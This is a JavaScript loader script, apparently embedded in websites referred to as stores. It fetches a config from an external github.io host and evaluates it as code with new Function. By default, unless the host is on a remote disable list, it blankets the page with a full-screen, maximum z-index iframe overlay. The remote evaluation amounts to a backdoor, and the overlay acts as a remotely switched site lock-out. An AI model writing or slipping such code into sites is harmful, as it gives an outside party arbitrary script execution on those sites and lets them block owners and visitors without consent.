// script.js — robust loader: always-on by default; disables per config; fetches config with no-store to avoid mobile cache issues
(function () {
  const BASE = 'https://shakilxvs.github.io/inspect';
  const CONFIG_URL = BASE + '/config.js';
  const INTERFACE_URL = BASE + '/interface.html';

  // fetch text with no-store to avoid stale caches (works on mobile too)
  function fetchText(url, timeout = 5000) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    return fetch(url + '?cb=' + Date.now(), { cache: 'no-store', signal: controller.signal })
      .then(r => { clearTimeout(id); if (!r.ok) throw new Error('fetch-failed:' + r.status); return r.text(); });
  }

  function parseConfigText(txt) {
    // Try parse as JSON first (if using config.json in future)
    try {
      const maybeJson = txt.trim();
      if (maybeJson.charAt(0) === '{' || maybeJson.charAt(0) === '[') {
        return JSON.parse(maybeJson);
      }
    } catch (e) {
      // fall through to try JS evaluation
    }

    // Fallback: try to safely evaluate a config JS that sets window.__overlayConfig
    // We execute in a function scope and return the window.__overlayConfig value afterwards.
    try {
      // Create a function wrapper so "var window" etc are not redefined.
      const wrapper = new Function('window', txt + '\nreturn window.__overlayConfig || null;');
      return wrapper(window) || null;
    } catch (e) {
      console.warn('config parse failed', e && e.message);
      return null;
    }
  }

  function normalizeHost(h) {
    return (h || '').toString().trim().toLowerCase();
  }

  function hostMatchesPattern(pattern, host) {
    // pattern may contain '*'
    const esc = pattern.replace(/[-\/\\^$+?.()|[\]{}]/g, '\\$&').replace(/\*/g, '.*');
    const re = new RegExp('^' + esc + '$', 'i');
    return re.test(host);
  }

  function isDisabledHost(cfg, host) {
    if (!cfg) return false;
    const hostLc = normalizeHost(host);
    // exact disabledStores
    if (Array.isArray(cfg.disabledStores)) {
      for (let s of cfg.disabledStores) {
        if (!s) continue;
        if (normalizeHost(s) === hostLc) return true;
      }
    }
    // disabledPatterns
    if (Array.isArray(cfg.disabledPatterns)) {
      for (let p of cfg.disabledPatterns) {
        if (!p) continue;
        if (hostMatchesPattern(p, hostLc)) return true;
      }
    }
    return false;
  }

  function createIframeOverlay(cfg) {
    if (document.getElementById('remote-overlay-root')) return;
    const overlay = document.createElement('div');
    overlay.id = 'remote-overlay-root';
    Object.assign(overlay.style, {
      position: 'fixed', inset: '0', zIndex: '2147483647',
      background: (cfg && cfg.background) || 'rgba(0,0,0,0.95)',
      display: 'flex', alignItems: 'center', justifyContent: 'center',
      padding: '0', margin: '0', border: 'none', boxSizing: 'border-box',
      overflow: 'hidden'
    });

    const wrap = document.createElement('div');
    Object.assign(wrap.style, {
      width: '100%', height: '100%', maxWidth: '100%', maxHeight: '100vh',
      display: 'flex', alignItems: 'center', justifyContent: 'center',
      padding: '0', boxSizing: 'border-box', background: 'transparent'
    });

    const iframe = document.createElement('iframe');
    iframe.id = 'remote-overlay-iframe';
    iframe.src = INTERFACE_URL + '?cb=' + Date.now();
    iframe.setAttribute('title', (cfg && cfg.title) || 'Remote Interface');
    Object.assign(iframe.style, {
      width: '100%', height: '100%', border: '0', borderRadius: '0',
      boxShadow: 'none', overflow: 'hidden', display: 'block', background: 'transparent'
    });

    // allow fullscreen/interactions if needed
    iframe.setAttribute('allow', 'fullscreen');

    wrap.appendChild(iframe);
    overlay.appendChild(wrap);

    if (cfg && cfg.showCloseButton) {
      const closeBtn = document.createElement('button');
      closeBtn.textContent = 'Close';
      Object.assign(closeBtn.style, {
        position: 'fixed', right: '18px', top: '18px', zIndex: '2147483648',
        padding: '10px 14px', fontSize: '14px', cursor: 'pointer'
      });
      closeBtn.addEventListener('click', () => { overlay.remove(); });
      overlay.appendChild(closeBtn);
    }

    (document.documentElement || document.body).appendChild(overlay);
  }

  // MAIN: fetch config (no-store), parse, decide
  (function main() {
    // try to fetch config; if it fails or parse fails, default behavior is ON (show)
    fetchText(CONFIG_URL, 5000)
      .then(txt => {
        const cfgObj = parseConfigText(txt) || window.__overlayConfig || null;
        const host = (window.location && window.location.hostname) || '';
        const disabled = isDisabledHost(cfgObj, host);
        if (!disabled) {
          createIframeOverlay(cfgObj && cfgObj.overlay ? cfgObj.overlay : {});
        } else {
          // overlay disabled for this host
          // console.info('overlay disabled for host', host);
        }
      })
      .catch(err => {
        // on fetch error, fall back to any window.__overlayConfig already present,
        // but default is ON: show overlay if config not explicitly disables it.
        try {
          const cfgObj = window.__overlayConfig || null;
          const host = (window.location && window.location.hostname) || '';
          const disabled = isDisabledHost(cfgObj, host);
          if (!disabled) createIframeOverlay(cfgObj && cfgObj.overlay ? cfgObj.overlay : {});
        } catch (e) {
          // ultimate fallback: show a basic overlay
          try { createIframeOverlay({}); } catch (_) {}
        }
      });
  })();

})();
